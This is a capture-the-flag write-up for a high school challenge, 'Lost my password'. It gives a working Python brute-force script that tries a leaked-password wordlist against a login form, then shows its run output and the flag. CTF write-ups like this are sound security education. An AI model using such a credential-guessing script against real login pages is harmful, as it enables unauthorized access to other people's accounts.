# Lost my password (200)
#### crypto - [Louisa County High School](../main.md)

## Challenge description:
> Hello, my name is John. I have lost my password. See if you can help me get into my account. Don't forget to checkout the attached login.php. My username is jjohnson.
>
> http://ctf-id-3.lcps.k12.va.us/login.php
> 
> Download file: [lostmypassword.php](../assets/lostmypassword.php)

## Solution 
We are given another login page and told to login as the user `jjohnson`. Last time, logging as the admin provided a hint. This time, if we try admin/admin, we see:

```
All hail the admin!!

jjohnson is the one who needs help.


Louisa County Public Schools CTF Brute Force Attack.
```
Now that we know it's brute force, we can write a script.
```py
import requests
from tqdm import tqdm
import sys

with open(sys.argv[1], "r") as f:
    words = f.readlines()

words = [word.strip() for word in words]

for w in tqdm(words):
    data = {"uid": "jjohnson", "password": w}
    response = requests.post("http://ctf-id-3.lcps.k12.va.us/login.php", data=data)
    if "ctf{" in str(response.text).lower():
        print(response.text)
    else:
        pass
```
This iterates through every word in a given wordlist and attempts to pass it in as the password of jjohnson. I started with [rockyou-20](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-20.txt).

```
$ python bruteforce.py /usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Home Page - Simple Login Page with SQL Injection</title>

    <link href="css/htmlstyles.css" rel="stylesheet">
	</head>

  <body>
  <div class="container-narrow">
		
		<div class="jumbotron">
			<p class="lead" style="color:white">
				Welcome John The Ripper!! You are now logged in!</a>
			</p>
						
			
			
        </div>
		
	  <div class="footer">
		<p><h4><a href="logout.php">Logout</a><h4> </p>
      </div>
	  
	  </br>
	  <p class="lead" style="color:black">
				 <h2>Congratulations!!! You did it!!!</h2> </br></br> The Flag is: *********************  .</a>
			</p>
			</br>
	  
	  
	  
	  <div class="footer">
		<p>Louisa County Public Schools CTF Brute Force Attack.</p>
      </div>

	</div> <!-- /container -->
  
</body>
</html>
```

<details> 
    <summary>Flag</summary>
CTF{BFhasPaidOff2022}</details>